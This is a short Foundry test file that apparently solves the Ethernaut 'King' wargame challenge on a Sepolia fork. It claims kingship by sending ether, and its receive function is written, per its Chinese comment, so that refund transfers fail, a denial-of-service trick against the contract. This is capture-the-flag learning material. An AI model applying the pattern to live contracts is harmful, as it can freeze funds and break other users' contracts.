// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {King} from "../src/King.sol";

contract KingTest is Test {

    function setUp() public {
        vm.createSelectFork("https://ethereum-sepolia-rpc.publicnode.com", 6631128);
    }

    function test_BeatKing() public {
        King king = King(payable(0xd73ec109834C5F415c54479CE7D831bD97a60622));

        console.log("king : ", king._king());

        payable(address(king)).call{value: 0.001 ether}("");

        console.log("king : ", king._king());      

        // 模拟 submit instance 看能否成功
        // address owner = king.owner();
        // vm.prank(owner);
        // payable(address(king)).call{value: 0.001 ether}("");

        // console.log("king : ", king._king());      
    }

    receive() external payable {
        // 实现复杂逻辑使 transfer 回来失效
        uint256 s = 0;
        for(uint256 i = 0; i < 19; i++) {
            s += i;
        }
    }

}
